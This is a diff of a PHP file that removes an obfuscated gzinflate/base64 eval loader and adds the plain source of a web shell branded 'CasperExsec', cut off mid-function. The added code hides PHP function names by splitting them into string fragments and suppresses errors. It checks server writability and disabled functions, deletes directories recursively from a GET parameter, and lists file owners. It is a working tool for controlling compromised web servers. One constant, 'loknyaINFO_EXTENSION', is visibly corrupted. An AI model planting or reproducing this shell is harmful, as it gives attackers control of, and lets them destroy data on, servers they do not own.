@@ -1,6 +1,878 @@
+<!--- Name     : CasperExsec W3BSH33L                               --->
+<!--- Github   : NULL   --->
+<!--- Telegram : @caspernearyou                                 --->
+<!DOCTYPE html>
+<html>
+<head>
+	<?php echo "<title>CasperExsec</title>"; ?>
+	<meta name="robots" content="noindex">
+	<link rel="icon" href="https://i.imgur.com/Be4uoSM.png" type="image/x-icon">
+</head>
+<body bgcolor="#1f1f1f" text="#ffffff">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+	@import url('https://fonts.googleapis.com/css?family=Dosis');
+	@import url('https://fonts.googleapis.com/css?family=Bungee');
+	@import url('https://fonts.googleapis.com/css?family=Russo+One');
+body {
+	font-family: "Dosis", cursive;
+	text-shadow:0px 0px 1px #757575;
+}
+
+body::-webkit-scrollbar {
+  width: 12px;
+}
+
+body::-webkit-scrollbar-track {
+  background: #1f1f1f;
+}
+
+body::-webkit-scrollbar-thumb {
+  background-color: #1f1f1f;
+  border: 3px solid gray;
+}
+
+#content tr:hover {
+	background-color: #636263;
+	text-shadow:0px 0px 10px #fff;
+}
+
+#content .first {
+	background-color: #25383C;
+}
+
+#content .first:hover {
+	background-color: #25383C
+	text-shadow:0px 0px 1px #757575;
+}
+
+table {
+	border: 1px #000000 dotted;
+	table-layout: fixed;
+}
+
+td {
+	word-wrap: break-word;
+}
+
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
+
+a:hover {
+	color: #000000;
+	text-shadow:0px 0px 10px #ffffff;
+}
+
+input,select,textarea {
+	border: 1px #000000 solid;
+	-moz-border-radius: 5px;
+	-webkit-border-radius:5px;
+	border-radius:5px;
+}
+
+.gas {
+	background-color: #1f1f1f;
+	color: #ffffff;
+	cursor: pointer;
+}
+
+select {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+select:after {
+	cursor: pointer;
+}
+
+.linka {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+.up {
+	background-color: transparent;
+	color: #fff;
+}
+
+option {
+	background-color: #1f1f1f;
+}
+
+.btf {
+	background: transparent;
+	border: 1px #fff solid;
+	cursor: pointer;
+}
+
+::-webkit-file-upload-button {
+  background: transparent;
+  color: #fff;
+  border-color: #fff;
+  cursor: pointer;
+}
+</style>
+<center>
 <?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x3dwvSG5\x63yDdmrI0j\x6347YN1D7H/T4Lg7pi\x43W\x41p9\x62U\x41X\x63GQ\x418Dlk1JXXTk/LJxHm4zjkvxuE33HIP0z5/4o\x2b7YptN\x2b03pmo2x5\x424\x2b4k5LErhL1LGZxtz\x613hvY3ht0h8e076y1v1jN\x62SZMWinun2U9WMuJ01mwQU7O4s/uVEyHoXE\x41T/2Y\x63zr7vVrU72Ym/Um7E15f5ie/5FPON0y3s\x617jmel92qOYDLmSR/U6f\x41\x63suVf81Wr9E8wGirI0kzFQ\x62ENWuwN4\x2bj2EqF\x426RuPLr8\x43msh\x62GDElL83ismnJu1\x41gI\x421eRV7U7\x62tHR7p\x43edZ\x63T\x62\x43J3Qw6PQGPF\x42\x63jT5wd\x2bPMOgP8KV8XYLq8R4F\x42/g3u\x62TjJFY1LLU\x42dH\x61ENU\x420No0Pv8LTtELoWSE\x438Gdo3OJRl9G3d\x413NL5xYVz\x42xrJdx\x2bhRFFgoOrh/\x418s\x2bg\x63YZH8dI\x2b12Ez9jN\x41Gu7xhHJuesrrKPMMfxRj4Hg\x63xvqQPsl\x42Q15\x63yK2Ns\x61f\x62o7u\x2bNtiZnws9jy/lGW/wT\x41\x41yd\x61O7NO0D\x63EiS\x2btO02qt9Q42fk6mURuxRPux\x61616QW\x623JWzeTV1YNDrrlmq\x62vVnXFzd896u\x43VxVJj\x61xqZ/puq\x6123sOuOWXgl8pV1\x2b\x61LuJr5/SruGLYVvpVdeDsqF9qOx62WXn\x42kS/mK6mioSWVz\x63kz\x41vlkR2NN\x610zL\x416\x2b0NIxMm\x42Z\x2byE\x434ON\x61h3EZWzSkM9D5SP\x2bUVISIYLmorIJ6t\x432p3K\x63i\x63ti\x63d8kU\x2b\x42Mh/nylyN\x61U6x\x62mh\x61iDMf7m5lK\x41IRIkFXw13ZqUZEn\x62ET\x436ULs/n\x42oy\x62DqgY\x43dRM8fYGhJtg6Sv\x2bKoWD\x43P\x43YXhz6p\x611mhrSDNHi4eLWZ\x629N/lyrwSfLm\x61Yl9H1zW6FmS\x41V\x2b\x621Xoy\x41Euj3gk\x2bLkXIguWfpJ5weX9d/QFHx53KgFHgTi\x614luX\x42H\x43ofHe\x2bkU1\x2bYLrpp7\x43FKPon/KWS\x41kTl\x43NQzhlziwt2ZRfVs\x42JR3\x2bUM3dLd4g\x42\x614gTppuoZ\x41rWne\x61ONWd0ZgMMVX/6vhGy7u4G8\x41GWHfg6Xh8g\x62Q\x425f\x62yJmvrtJ9\x614e0/\x62SELeXEL\x43ImrtVeNz52pSz\x41WtLjq\x415MK\x2bzzQ\x62IIqH9\x2b02Efv\x41MPv3Kt0/8\x63z14XXNjJP8Uf5xj1HSOqgrwDQ1xelQ/JmQFPi1y70\x623\x41g1xpDXf\x427GKKit0EHqt\x2bxHW\x42\x63sw5Th24e\x63MNdF6VQr9wqYf\x43Ir8Yy0srWYE3Q1/\x42OzSMUnGPR\x62Jf\x42H9/71IwV/mk5eFTJeKf\x63\x62M\x41tV\x62ukM272N2\x623N\x2br/YD\x2b9K\x62z78P6LQKxN51TxJnq4V3NTU6O\x62vkvNMsGLtUJGTdzwFhzp\x615lHEh\x62O9ld\x43dxx6ziRH\x63dK\x2bTrX3NVmU0Vq5q\x42DxYq4qKiqm8TVrO\x626v65doTsVv2V\x62T\x2bYm75d\x61yviI\x62H\x616x6hMRDfVjvNLuq\x61gPu\x62ofvfIv7np7rTNOv3/QvMLxounsvq\x2bYNqvn6QXf16oTLTN2dL\x2brxN7v92em8Z/r6nk/D3\x62PMFMEkIM8OT26y\x42\x41NrFD4X5F\x61r5G\x62Wr\x41\x43LwN1\x62Q\x62zrexzfWZiE2Lm5HqZi3eth6y45NIsEHEe4Qm/V\x42J\x430iYEW6uIH\x42FoIu\x42ktzhwqIToEy4\x434KTly\x63tk7ODiFTE5dxiWqoW/g\x2b\x62oE\x41jTV\x4209pj08StGdOVk03KtN\x43MprU\x43vhM\x63Gtefgg5Mp81\x41dr6KFu\x426ns\x62MQ/TDH4j\x61\x62\x622f3SOWVg\x41j\x42Kn15\x62S/X\x63qvFgx1WiGSuSnNlEQrfF0huNXE/nr\x614hy5iN5qu\x41dRNdUg6mulQ3LmuHvW5POJh/r\x42\x429ysP\x42V\x41Q\x42\x62guyri6\x62Zjjh\x42YYxpMqdU6n4Em8n6Kqosl/f8O6jOOhV/5Ql\x2bWiO4XrGj\x6212D2UdTHIElot0/PQ82r4VsHzziro\x42znk/3tUYGwO5iit\x616Gs0W\x41nS29MzQzG1jgV/LM\x62Ee2NQQZHg\x63ILoHZU\x61okfW4739R\x41qe/O3Gn6HtmW\x63YE/szL6KOR10kLFxTS\x63DQrlV\x61YHpEFQgs8s6gw9gVQ\x43\x62rfE\x61Q/7s1f\x62hRi3/8XT1etJ3yiv\x61\x61GqVSD6OMzh\x62svm\x63SdY\x61EtiSE\x62/Zv0\x61i\x42WuZF\x61lgwh5FGPei3fzi\x41O1\x63l/1rh\x61K\x6160hegvumqyIN\x42fpy/zmFu\x63l\x61ktJgogSXnVnE\x41oWFM6wZ\x42PLfRS1LWSMtHdZ1N3Nk79e\x42K\x43H6gYfdXl2\x43qlj79giiU7srR13jrhx9/GRfw\x4321\x62I7Tt\x61d/KRO2G\x2bVe3d1n8KrVUi0r\x61Vm1HsZevXsXingy6n\x2b\x61t\x63l\x2bz0xeoSh\x610FK6mtouzU5GefqyT1V7qW8\x62G\x2btmles\x63\x63vKe\x63iHHkvjWzqW9D9GqMnh9Kr6j\x63fulf3eVuvW1Run3m/MMT3\x2bmwPRy2z9S8ULyIH9DZIN0ZuhI5EWt3om/MS0Y3Vi91SkTFYgK\x62V4zQXqdm\x2bfJSofvTP\x613qJEd\x62te1n6qrDR3hsx2hw9VvUnZe/\x41340eY\x62qyHtT\x61\x42pvg29D9ggdzS7\x2bX\x41xygt\x61\x62YoHzQwhJTZY7h1G\x63leP\x63iufhXwNK\x2b\x2b\x41D\x63mmLy\x63ku4Sh1\x2bX6f\x63zzt12G/NYj71i\x62EjtnmWfPFeZf918f\x62eZr6yRLp3LlpWp8mdj\x62w52nuxIzY22\x62g0ZkxKf\x62PlYzQxd02UEtPXpINspyO\x43\x41h\x62\x62YVVj2TzZ\x63k63WZ0K3K/kM\x61lz26v5RSIVxV4\x6317\x61r\x63lJlvRS\x426GVGp\x43jvh3yM\x42t\x63FZ0\x62sg/ONNXe\x63\x63zZzGioQN\x61k\x43GUxseuwkVx\x416pTi1MhWI\x43J2tg\x2bx9\x62G3xYQn9xQTz\x2bXmtzN\x41\x42\x62inEwp18g/zSINHS\x41/s\x43jh\x2b3XzIyHVm7eY\x61YMkvUYjdn45h0NjdrEqn2x5DG4i6MWeq\x42fLuW6\x433SJzgT0\x43Gfwu5\x2bUds1ZdZIRRmQNv2TKh5fgzZwr\x43n\x63Dl4zUKleorQXjfGX9\x41MWt\x63twDsiJp\x43S22kUXzn31GKz\x61tQ6jk\x41s\x43EKhYzyPJUEsz\x62Vq7s5Li5EgVJKL\x63\x624p\x2bWrgXl2HgkW2vx978vvi\x2b1rNin8\x42tVO\x42KMP3EF\x42\x41TWZiSV9q4k\x63Lidq8\x61xUuDkMF\x43XmWzltQZl9z5mxxM9FPU\x43DULy4\x61X\x63g\x61uer/81vsVPXDmuIpLRFiUotl27Y4Pj5o8k\x410r2j\x42KdMDHMUxFu1FZXTPishxPrpw\x613oQSL\x61l\x42F\x61FhVvMLUh4RRZxMY\x62KhxZl5N\x61y2I\x61t\x42V9mmuk\x43e5ITORfdpJmKLLoS2pp6KgntUDjEYEkVeX\x62YD\x62RTme1g/8K\x43yRX97g7\x62xHfPEQuLo7Wf61jf3w\x41lkpwNW\x63kYn1pEsmORV/W2XwS\x428N\x62ljM3z\x62h02Fw66Gp13eozRvgk\x432XG0mM7\x41f\x43T\x41i\x2bxdiED\x63jYNn5E\x2b3\x63PwmuLvd2ZHGGxdksmUs06Y0JOIX\x43tFUM3q7lYOh\x43OHuz\x42HXP0N\x4377Un/Ir6FDXrW\x63YHIU5\x436GFw\x63JIU\x61lpTgVxKQNFVj61dS\x41zmTHsVOPW\x43T1dK4uGtK4\x62SEoyjL3Fp9r8Vl5Qjg\x61nlx0\x413Dk\x2b\x41\x437g\x42eQ8gFDYVz\x43OiuUygmRDjVUmxE3f\x61MDhLZI\x63Tk\x61i\x62\x2b92nxZFQvi4wJ9Nhi\x61ekMYuIMd\x420\x63PmY2MM\x637VGeyXMOe\x41VtNw4OPU3p/EDKRggE3Pj\x425JY8\x43y1YLh3RVVQFJ7UtF\x62D\x42\x2b4ITRERoLNHHJdl\x43Vtrmid0Y4S2JF\x62w1uE\x43kRtNHxp4txt4W9O5\x41K1Lq\x63w8Nz6J\x42\x2bvFhWMG\x42Q\x631RKGNYKTvIshDqnnGOK\x43T\x620\x2bF\x63/\x63kl\x413OKrE3YXS\x42sywTSZdYGgldJ\x624VYWES/0xjZg9ZqFE5v6E10OEzmpOKfiL2KjPlJPO5upoX6uqqx7r2U9T7XqFiKQur\x613K4rl\x61Wod8W36t/7QN2\x43fp\x43hZfNnqhEMHHuEzl0vZ4WF13mNN\x4294WVPSruV4Z4\x63\x611tgQLKhyRgyGwS0IEQg\x41LVqUThV\x41\x63PlV\x619\x61KrRtyUuZYKYgDOo\x41D2kPmhnoQ/R2\x43TPVFJYw0Jr8iVz5S/8O3wyqD5XoQqkHumrhwX7TrRN4qYXZ/3n538\x63Iw2dkO5hmM\x42k\x62GQmkdGS6D09FeQsoY9If\x42wWH242QKiW\x2b4MMVRGPL\x62el64ee\x42vd2G\x42uKzW\x42oYRyPG\x42D2rw\x610Z\x61Sg\x63H9\x61\x61xgEM3yjHpZXiNL9VXUi1v0\x4186sGpQU3GiQ/fErikv6jEGzKyZMk/jwS03l\x43uRZj\x2b2\x621U\x412Kpv4wVEL\x41Pmdll0U1XFPIS0rhDV9YsIpMHTWkrpsyH0Kqmurm\x615woUnznnqn\x63\x2bV3KO5Vz\x429MWuq0ZHh4esJRfpL7JYIvk2KWwgmPNPyXrnpRVpLnwRWfMHSQT7rg0lzg1hV\x43l/Vm\x2bKTg\x62WZkkTJfQtp\x61iiH9g4d2TJ\x63G\x2bzM\x43f\x41FzOUui\x412\x62QRspYY\x63JtpK\x62F6\x41\x43k\x617DhhRPe\x43QLO5k8utJ1qz\x61MV82v37P8RF\x41G5\x63jfOHtkZ\x61e\x42eG\x428\x61TzlSjtWUmomLUDt2tmyuMOEx3YDYwUE8UG7kNzmQq\x63kD\x63n2IeOhLdG\x62GFQFVkGNU\x628Y/Q\x4181o\x2bI\x42\x62sJi0F\x61oNFfqV5p\x2bWf\x63Pxvksw11nu08hQ\x42In3e\x41ts1\x63Dtp\x62r1Xv7e7DYRj\x61j0TVWZYiKqpMHL\x41ulW/\x43\x62g\x41O\x43L8\x42\x62xKEIWS\x62im89yFLZ2PGmKNiDyj1N\x43\x62Kyo\x63LwHlRhXT\x63YfWh\x2bsX\x61O6sDPdedv6RU\x43IoGed\x42ZGdP\x624TepnR1JpQfSY/pYtjTp29I/l/HYEh\x2blX64Ht\x61iWKtDxm\x62nRmXY\x61jRO99\x2bJQ\x2bdukomrF50Y61o4MtE2PLFJmheRhIeG\x61k\x61Zw0ug0ztmhPe5MVhzKTvj5h1FGIX78TlWOT0ePjg/7jij0TMWOif2zity\x2bIyYy4zH9Fp\x2bg41\x62S\x41gZVUxRHfjZg\x41u6mYYiNd8VmlJKO6MI9Oz\x2b\x63nwstsss4Vq8U/ojxJgGR\x61PpskvUL\x43X9\x63\x2b70jfUZL4IRL1GDDl\x624l0XYGMemZ2\x43MUg0\x43YZr0nKPhhEDu/wK1vnKt\x41PhxDMJ9eJ\x43uf1dqq\x633KKNLgTFv2USKgxhINoYe\x2bRLvNXy\x42FHPo2IkMTgiGk5l1dtHeRg7gShw6\x43eU8QLGzR\x42FlJfOj0oFi8p92O\x62zK\x61kZyjlPUQFyMFuhwdXIUi1Gr\x2bWW5GfyqJ\x2bPVOl\x41oPv3jRMEv\x41w/\x63MLzTo\x63iqr\x41T\x62W\x41W\x42R\x43iO5M\x61keE6g\x61JSpNF\x43O2F\x2bD\x62HGiYYH3tkwJu/GF7\x41EmQTynP\x61GJ\x41K4mDw7Mt3Y98DTj\x41NDi/if1Q5J\x62I4W59\x61\x627nj7rtl72PmhxzQrYGUgrON\x43E0OPw6tJpKiu\x61t\x2b1pew7\x43fD5/qUD5mgtz0Zkt\x63OMMPF\x61\x43XFuGGP\x61OQutoq\x43tOiQ2Do\x42mpJImdzhYrvtuoZWVoKDZxvHNjFZk\x63KzGM\x436x\x61SWx4g6epg\x42\x61\x630Epomk5pkHh84dgMYw\x41ETgfjRGEN\x612lsDGxK9\x62G6q0\x41\x63tNsYZq\x43\x628Q5Eh\x42PG3tmRQQE5PmRDfLrhrL6ZJ\x2bUUGS\x43LxrJNvHuFD\x43prui\x2bRVNykm6puW4W\x42VMMSuoXUinF\x43JZIP0EK\x610Rs00W7\x62gjxxprpU\x62WWqsglhy5ZKLIZT\x62\x418YRzZ\x43r7n7\x41Ieo\x61\x43G\x41Xe58nGhEEyL09\x42p\x63N8/h/WjXz\x63NZYsKLlOEVOKQKIz\x2boZJRl8\x427S\x43eVloHSoujwwvQ\x63dWp2rSjHM\x62l\x42UHod9R7OZgkQqT72k4UOpKF\x61\x42\x62tWiZF80sI9k\x43\x612x\x63JXLRENX1/rKOoEMu\x2bDFM\x62\x41P\x433ss\x41X0f\x61TlnR3J\x61N1m\x623HmYPlyz1fv\x42WYThgrj\x41FwQ\x632w5QLuEF\x42z\x2b5fH38zz\x43sM\x41kSv07VYekL0hq2d/iogSqOlneU1\x2bjvJn4Nh0lnTdF\x61\x41W\x61Gd\x43t\x42RnL\x61gNWOg4W\x2bwM\x42MzeIy73J\x42U\x62kvwm\x63EIhzo1\x61mUqfHwf/3JS0Ro\x42H\x61iQMKTi\x2bgOS4Qeg/\x636\x63H\x41SN1HR\x41L4USWSni5J9MdtRj/\x2bzzSFJkIeZXV\x43Vpo7LoXK\x63OUd7gDkmlwF0KzIJ\x2bShI3rx/lr1hpHE\x62lGfP7W4Hy1I\x42LUk4zIo5W4mDUGy1YZmxWIt\x425Vzw5jZIJRXpl/NNVZF84\x62i\x421\x61Ql\x43W\x63rJ3yJ7EyoP/Dk171s/U2LWgxFHq\x62dZgFR\x63FNnFEmIy\x2blq\x62I\x61EXnfEvVE7\x623Iv0dzENl\x43\x43HulMqTKLO3hEDkglM\x63PKY\x63n2fZNsLdf\x62NZW\x42Jkq\x621\x62\x43T7E\x43\x63hwtEQsx8DEFhEN\x43QKL5M\x61hNlsi\x61wOnxOQZE\x41KVELvrXdF\x436q3DTRHRF0E78y9k/eE\x42PFzdrXR\x43\x2bHMY4OuqmLLJnPQYXPHg\x63qNfrixUuYLmXPRoT\x63JM\x42xwkmS0ftvrSrSXe9YX9t6xS\x43zxqW2\x2buxvXruvJ\x43smmzL8\x41TMf6tOJ\x41KI\x2bp\x41htT3Iv\x43W9O6dGG\x43IeToM15G2\x613rg\x42DgFFXYZXZNfsokURVsrgrMYJ3zd8EDulWN8No0sP1O1j\x43xiZxnNE1sxhT/Rhu\x42O\x41qZzLT\x4140vZVz\x63o\x2bN0/rz2x1\x613IlE\x61mmN3Oy\x41sZWSHKLJPKv148nl353PLHe38HjnreE6ZdyLX2\x42\x2bNKLlYiySJJ4K\x42/4xff\x63IZkkQXgZx\x41GytXDg1EVF\x2bEKixGJvpgsY\x43HoJL6m\x42dS8\x42PG\x41IdXu\x43\x63o3e\x2b88TP68/8Te0FH\x2bG5\x42ND\x62w\x435hIHPIUs1Z\x61\x62RJZ1PkornkHqpU0R6DqWU36\x42ru\x43vy46Ys69q\x63NotH8uery\x2bY\x43xqpiIg05KomjOqy\x42Z5lfE6SnngOO5UpuFSIWgGtKe\x414uQVpQ/\x42jqDoN3\x411K\x41Ol6oQlq00SOEjL1QFKFV8nxPe/yX\x42iJV\x43DzPelgJG/Y6Djnv\x62g0YYTFuFjgPlhJh29\x42T8DEg\x41\x41\x621jhPYYoJr\x61K7nw1H\x61m\x413FFT/g3qwYvJuL1rMnfm\x63zS/q9T7H\x63\x61RHe8O2kFiy\x42v5Uf5h/8lnrfGonGq\x2bN0WJWohszzlX\x62kx1yV0ixErthul\x41rd\x620Pn4u9Y8Mf\x62OwlXV\x61\x42ufl3somK7eOzOyF\x61e6Eq\x63LzyV0O\x63y8tKyJEjI6E7k\x2bKqXx\x63YFlDkVsg\x61L\x41KMqGeQoHX4k8IysgWs2Ktzkx67n\x638jflzGiDoyZV4rYHqZ79tL4\x41j\x613OMw\x43M\x42n9pR2\x43TrE8HdSNnDZMF3gv5XplG5NZmfwtl\x63hgMpNEUELMvhklgRRSv8qT0K\x43PkmNw\x41tEyRTZhYuJGheYZElDvdfugt9N3JHY2jWmjiuD28mLZv5Qgg7Zny\x2b\x62\x41FPUiP8gky0DDM2SEdSE6yW\x61qv98UG/oJyuR\x62uhHd4x3\x63j7sEmsg5nsDS\x2bVQv7y2Sr\x43SR9fe8MHzqFIVDonVIDdhYxJoig\x2bZnDs\x41\x415YyI9\x41L\x2bnSIwK\x430i4xVH\x42vzdI60joJI\x61O\x63RDDpRMQmNgYf/nk\x2b\x43GMFISPNyRQE\x61PTxynNZiY0j\x612Lr1y\x2b9to\x625DYrM8P/\x41o1K53I\x2b8Hu//kTO78qWo6RJoHWRw\x41Vu\x43u6p\x63g\x43iuqMitEKY\x41eljgIJJQ8KYIKt40ZvPIRjpnPykpgPhkk3H\x63EeYnlrwi\x2brjs3xWiQ6E5u\x41lYxe4wf2zJP/0j\x2b/we9sD8ZH\x43gDDK\x63ULSQ\x42TVg4Lw3PV\x41QwISsioF\x42j\x63m5TQ7Y8J\x43wI2\x42iJVM\x43U\x43E95rHv24\x42ef\x42erj\x42YIlrlD9\x63U8U/Vygfx2eUY\x41y6R\x43z1S934uSYVQOhE\x41s3FT0\x62xmHD\x61kkn\x2bHHht2\x2bsY\x624HSmM8L2FZRGWpI\x43m4WLQe3HRVIUJJnQ\x2bzSJ\x61TyQSPeoiH\x61\x42MHhEoE\x62\x41QUVi4RzL\x41r06SV8IkOwzFqXQ6R\x62TsjV5\x43G3JQu\x43xLXKYkvkLWpY6ELmsyGTd\x41SQxQkgJ\x43\x2b4QL\x42NimIOf9EwD8RP\x41ei9ry\x63Dh\x41\x41ygSk8xYMiw\x41IF4EUveW\x41YIIMJ\x2bW\x41POfyQ8\x43WkgHf8\x43F40Ye\x42gRDMwHEmD809rLS\x43I2T/\x43\x42\x2bd\x43h5wiZjUGNl19V1jPeJ\x43wxoXOxur964\x2bH67sX8sMZS\x2bIzTE7P\x61os/me8z\x41jv\x626vN\x43oDNiWZRjw\x42H\x61/0\x62k\x62HyHSxH5yYxZ\x63EOOP\x41R\x41E7kRHpFym5nN38QmeG\x430QK\x41PLww3\x63YtP8XUIPv\x2bwvFg3J5nfO4Ny0M7\x41\x628/Fjn1nv\x42IvXgFs/V8UgYU0s4\x429D3sXkfd9\x2b9m\x41\x2bHf\x63EHkj\x63hOY7xir\x2b/6E7kuXlMum\x63putKI/ivH8J3hp9k\x42K\x41okkVmFufp8\x61UK\x613h\x42U20\x61gQ1X\x637\x6304sMXg\x42\x617uqq6jPXgGY5l41W\x62\x41IN3\x63j3rFKs9YoWk\x62IP105QekpE\x43\x42pWHTE6Vzt\x2b8\x42gM\x2bKi\x61R\x42O\x62\x42LHlt9y\x41sjJ6QTHWZLVJ2U\x61H\x2bR\x2b9Y\x62D8kMeTfQ\x63\x420\x2bz\x63/0DUWm0TrEK\x42wV24vRuLs9\x63L8nwyT8smh\x61xOIqq6qtWSeivNLHXrtngu\x62Z7hYXnzxhikiggETU8wjq\x43v8uz2e6sRq9rfh/oqYoYRPlksFH/\x62gZzJN9D3h6i58v\x62\x62xPiud\x41So\x63MFo\x63e\x43H/YzX3Uh0JtqyWv\x630z0v3v3hV\x625veiW4\x418WTNo\x2bORZq9z37ef0\x2bzPY0ge3Otn9Wd/dMTfK\x624fhzUJomRy0zSM9RwO8mfT\x62KNgjTmoPtr28kVxe\x62xFKkeMvWdw\x61le6w\x61StSoP8dfzXD5Nnrhz\x2beXZPJTPm\x42YrrH0NdtIjf\x41qwf\x2bPt\x2b2\x63DiS\x2b/7PQOg/dEv/v9vwf8vhLxpd3/E\x62hZ19fnHDsNn3Ldt\x41L\x61jxV\x43hZ9\x41p\x43uLK4v8vRg\x41\x2bSj\x63f/eiHHw\x420dnX\x43rI876t5v1mj3l2emROLZWEmlPqyg\x618kE0yn5etxyGNj1YVNj2uVwndFLzT\x2b08w\x61Ip\x61\x43J8GELLDe\x6355hxZgdM\x2b8wnPzML3n\x2bg16IQ49ysmht8wfLs\x63n4ihRi3g1iyg797WUUkS/OnieXOL\x2bvX7Uo2jozy3\x42IwXN\x431f\x41j\x62e\x2bKzO2eKZlN/Y8Yn5PIuSfkWFUt/LPIZ4k1JQ\x638s5N0yY\x42uey2fwH\x42nHnLFolJDSyxoYGY4LXtOI\x41\x42MyIneZMdJW\x61\x41GUp5rIxsDLy\x2bv1ntILLZ8utnX7wj8FgzGy\x2bM2NUe\x2b\x63s\x41W\x41DeIJ8nGI8W903gxrNni\x42GQvY8y/Zi4zhZs1qHwU\x2bZTEsz3\x62IMz/Lk8JFyIy\x42707vne5ozYR\x42l14\x63qpVOgmtRpy75UWq\x41v0fyMXM9TVM5wntw29hwv\x61qf\x61G\x2bVDdGp\x42PmE\x63h3Lv399Ks\x63\x43MVxfS\x2bhFQ193XHX7\x42/vVFoTff\x2b50LHdM7nlgPUD/iY\x62//MMOMDP77fDK84lT6ve6pneqpHkp\x63\x617N/wpOK4\x43DDPf3\x62/SO2IkYI\x42\x61gihVMgWoi\x2bULpkYnqsypk8\x62hkk3y\x62nWKFR1D1F\x43Hzh8r\x61mfKpx\x62PX\x6190e5jo\x423\x42wJeljhGnHQ5To\x427\x42wJeljgG3HQ5Do\x42/\x42wJekj/GHE\x415zv\x42D\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
+echo '<font face="Bungee" size="5">CasperExsec</font></center>
+<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>';
+set_time_limit(0);
+error_reporting(0);
+
+$gcw = "ge"."tc"."wd";
+$exp = "ex"."plo"."de";
+$fpt = "fi"."le_p"."ut_co"."nte"."nts";
+$fgt = "f"."ile_g"."et_c"."onten"."ts";
+$sts = "s"."trip"."slash"."es";
+$scd = "sc"."a"."nd"."ir";
+$fxt = "fi"."le_"."exis"."ts";
+$idi = "i"."s_d"."ir";
+$ulk = "un"."li"."nk";
+$ifi = "i"."s_fi"."le";
+$sub = "subs"."tr";
+$spr = "sp"."ri"."ntf";
+$fp = "fil"."epe"."rms";
+$chm = "ch"."m"."od";
+$ocd = "oc"."td"."ec";
+$isw = "i"."s_wr"."itab"."le";
+$idr = "i"."s_d"."ir";
+$ird = "is"."_rea"."da"."ble";
+$isr = "is_"."re"."adab"."le";
+$fsz = "fi"."lesi"."ze";
+$rd = "r"."ou"."nd";
+$igt = "in"."i_g"."et";
+$fnct = "fu"."nc"."tion"."_exi"."sts";
+$rad = "RE"."M"."OTE_AD"."DR";
+$rpt = "re"."al"."pa"."th";
+$bsn = "ba"."se"."na"."me";
+$srl = "st"."r_r"."ep"."la"."ce";
+$sps = "st"."rp"."os";
+$mkd = "m"."kd"."ir";
+
+$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];
+
+$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
+if (empty($disfunc)) {
+	$disf = "<font color='gold'>NONE</font>";
+} else {
+	$disf = "<font color='red'>".$disfunc."</font>";
+}
+
+function author() {
+	echo "<center><br>Nulla tenaci invia est via.<br><a href='https://t.me/caspernearyou' target='_blank'>CasperExsec</a></center>";
+	exit();
+}
+
+function cekdir() {
+	if (isset($_GET['loknya'])) {
+		$lokasi = $_GET['loknya'];
+	} else {
+		$lokasi = "ge"."t"."cw"."d";
+		$lokasi = $lokasi();
+	}
+	$b = "i"."s_w"."ri"."tab"."le";
+	if ($b($lokasi)) {
+		return "<font color='green'>Writeable</font>";
+	} else {
+		return "<font color='red'>Writeable</font>";
+	}
+}
+
+function crt() {
+	$a = "is"."_w"."ri"."tab"."le";
+	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
+		return "<font color='green'>Writeable</font>";
+	} else {
+		return "<font color='red'>Writeable</font>";
+	}
+}
+
+function xrd($lokena) {
+	$a = "s"."ca"."nd"."ir";
+    $items = $a($lokena);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $b = "is"."_di"."r";
+        $loknya = $lokena.'/'.$item;
+        if ($b($loknya)) {
+            xrd($loknya);
+        } else {
+        	$c = "u"."nl"."in"."k";
+            $c($loknya);
+        }
+    }
+    $d = "rm"."di"."r";
+    $d($lokena);
+}
+
+function cfn($fl) {
+	$a = "ba"."sena"."me";
+	$b = "pat"."hinf"."o";
+	$c = $b($a($fl), loknyaINFO_EXTENSION);
+	if ($c == "zip") {
+		return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
+	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
+		return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
+	} elseif ($c == "txt") {
+		return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
+	} elseif ($c == "pdf") {
+		return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
+	} elseif ($c == "html") {
+		return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
+	}
+	else {
+		return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
+	}
+}
+
+function ipsrv() {
+	$a = "g"."eth"."ost"."byna"."me";
+	$b = "fun"."cti"."on_"."exis"."ts";
+	$c = "S"."ERVE"."R_AD"."DR";
+	$d = "SE"."RV"."ER_N"."AM"."E";
+	if ($b($a)) {
+		return $a($_SERVER[$d]);
+	} else {
+		return $a($_SERVER[$c]);
+	}
+}
+
+function ggr($fl) {
+	$a = "fun"."cti"."on_"."exis"."ts";
+	$b = "po"."si"."x_ge"."tgr"."gid";
+	$c = "fi"."le"."gro"."up";
+	if ($a($b)) {
+		if (!$a($c)) {
+			return "?";
+		}
+		$d = $b($c($fl));
+		if (empty($d)) {
+			$e = $c($fl);
+			if (empty($e)) {
+				return "?";
+			} else {
+				return $e;
+			}
+		} else {
+			return $d['name'];
+		}
+	} elseif ($a($c)) {
+		return $c($fl);
+	} else {
+		return "?";
+	}
+}
+
+function gor($fl) {
+	$a = "fun"."cti"."on_"."exis"."ts";
+	$b = "po"."s"."ix_"."get"."pwu"."id";
+	$c = "fi"."le"."o"."wn"."er";
+	if ($a($b)) {
+		if (!$a($c)) {
+			return "?";
+		}
+		$d = $b($c($fl));
